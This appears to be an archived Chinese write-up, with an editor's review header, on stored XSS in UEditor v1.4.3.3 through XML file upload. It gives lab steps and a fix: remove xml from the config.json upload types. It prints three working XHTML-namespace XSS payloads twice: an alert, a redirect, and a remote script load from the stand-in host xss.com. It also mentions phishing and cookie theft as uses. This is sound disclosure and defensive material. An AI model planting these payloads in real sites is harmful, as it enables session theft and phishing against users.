---
source: "MrWQ/vulnerability-paper"
product: "UEditor / 上传型存储XSS"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Ueditor 最新版 XML 文件上传导致存储型 XSS"
prerequisites: "来源所述条件，未列明部分仍待核：PHP1.4.3.3测试，JSP版本未记；“最新版”无日期"
side_effects: "未执行；本文需注意的操作影响：最新版和危害泛化；仅PHP1.4.3.3及未记JSP，不能覆盖全部最新版；危害小/凑漏洞非基于权限和同源影响；缺浏览器返回头与域边界；只看上传成功和弹窗，需确认XML按何种MIME及origin提供"
source_status: "unknown"
id: "vw-cd7f9abf1994218aefe86562"
entity_id: "ve-cd7f9abf1994218aefe86562"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：PHP1.4.3.3测试，JSP版本未记；“最新版”无日期

代码与实验材料：两组完全相同的弹窗/跳转/外链JS代码在篇内重复，上传过程只图片

来源证据范围：有fex-team仓库、CSDN先前报告和微信原文

- **操作与副作用边界（1）**：最新版和危害泛化；依据：仅PHP1.4.3.3及未记JSP，不能覆盖全部最新版；危害小/凑漏洞非基于权限和同源影响。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（2）**：缺浏览器返回头与域边界；依据：只看上传成功和弹窗，需确认XML按何种MIME及origin提供。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（3）**：篇内代码重复及长分享链接；依据：同三份payload复制两遍，原文URL含临时分享参数，宜规范保留可打开原始链接。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Ueditor 最新版 XML 文件上传导致存储型 XSS

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?\_\_biz=MzAxMzg4NDg1NA==&mid=2247484014&idx=1&sn=456750ac618e992f59476173441ce0f1&chksm=9b9a8eb7aced07a14ba1d71602faabafaa3fea898c0d8f6a75e5b1dd5393c0fcd520027ace95&mpshare=1&scene=1&srcid=1013988WS4r6iiFhnhQwQgBI&sharer\_sharetime=1602549213049&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=68e9243f129238454bc3624948fc63c450fccca27c8899d461e4e2d740e200f016569ea52d151eed47b2d388461e2c5b6c8f3879ca1315b159a23e03fa0e87e5ef8297bc3bba301ddaa34c1f87238a3b21f3953bbb494d2ebcdfc82386915edf41e8753327229009446dd94f73a53254fc357ded25ac20e986aad99523c9f7e1&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AZ%2Bwcl5mEJlHUAHFxcMASvA%3D&pass\_ticket=2G6SwO4uyYCX4aTiQDJvW1D1IrAJXn1CnpH%2BbX1rykSOMZNKPaotYwa2vyHnTBud&wx\_header=0)

上个月测试某个系统碰到了，以为是 0day，Google 了下发现早已有人发过了。见：

https://blog.csdn.net/qq\_39101049/article/details/97684968  

**下载源码并搭建环境**  

----------------

测试版本：php 版 v1.4.3.3，jsp 版 (当时忘了看版本)

下载地址：https://github.com/fex-team/ueditor

IP：192.168.10.1

自定义的目录：ueditor1433(实际过程中请注意观察)

不用安装和配置，直接打开就用，不过上传文件的路径需要注意下

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5rLahQ3akyic6RXoAtrW0qAz7yLcqR5YqVlC037HEWnuyHibgkLdrY20Q/640?wx_fmt=png)

**测试过程**
--------

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5m5GhicA5uQrMpMxR5bLARnqb6MoSVVshzZly1icP6qmmdwTyPMP35JkA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb56Df3KkdXFSDNuz1wSA1H21B69lluuJqJqkS67tZp2q7fFys4xYSSVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5QFLduMksqQtxk4jvUnutZXp14PtYdFJKtJ0d10NKdrx1mOpTNeicHSw/640?wx_fmt=png)

访问触发弹窗，可以改成下面其他代码测试

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5nw1SGZZHKpdUic6NOnRzFyFDL8VXCCsmTkuDD1MEUFYGJbcZgumLwtg/640?wx_fmt=png)

有时候上传访问不了找不到路径可以访问如下 url 把文件目录列出来再拼接，实际过程中请注意 controller.xxx 的访问路径

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
URL跳转
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
window.location.href="https://www.t00ls.net/";
</something:script>
</body>
</html>
远程加载Js
<html>
<head></head>
<body>
<something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml">
</something:script>
</body>
</html>
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5snIbPTmWKUb01kBj8ChVwZrc2X8ubmQNicMlNcKFMjMhy2R710uDjxA/640?wx_fmt=png)

**常见利用代码**
----------

```
弹窗
```

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
URL跳转
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
window.location.href="https://www.t00ls.net/";
</something:script>
</body>
</html>
远程加载Js
<html>
<head></head>
<body>
<something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml">
</something:script>
</body>
</html>
```

**漏洞修复**
--------

可以看到在 config.json 配置文件里 xml 文件类型默认是可被上传的，所以去掉重启下应用或者服务器就好了

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfydhiawYTQxzNWznNWWOlb5eZRSibUMWZnvibBtMf3Xq7bueTz7IiaSz8lOocWh5IADoTtTdtuRoXkAQ/640?wx_fmt=png)

**实战意义**
--------

个人认为这个洞危害不是很大，不过可应用于以下实战场景，如果有其他好玩的场景或者组合拳大牛萌可以回复

*   **安服仔实在没漏洞的时候凑漏洞**
    
*   **URL 跳转钓鱼**
    
*   **远程加载 js 打 Cookie 或者其他操作**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
